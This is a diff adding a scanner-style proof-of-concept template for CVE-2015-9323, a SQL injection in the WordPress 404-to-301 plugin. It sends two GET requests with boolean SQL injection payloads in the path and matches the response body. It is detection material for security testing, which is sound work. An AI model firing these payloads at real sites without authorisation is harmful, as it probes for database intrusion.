@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "检测 WordPress 404-to-301 插件 2.0.3 之前版本中的 SQL 注入漏洞，通过向目标站点发送包含 SQL 注入 payload 的请求路径，触发插件对 404 错误 URL 的日志记录功能中的未过滤参数注入"
+id = "POC-AVE-2015-0065"
+name = "WordPress 404-to-301 Plugin SQL Injection PoC"
+severity = "critical"
+tags = [
+    "cve-2015-9323",
+    "wordpress",
+    "sql-injection",
+    "404-to-301",
+]
+vuln_id = [
+    "CVE-2015-9323",
+    "AVE-2015-0065",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/test'+AND+1=1--+-"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["1=1"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/test'+AND+1=2--+-"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["1=2"]
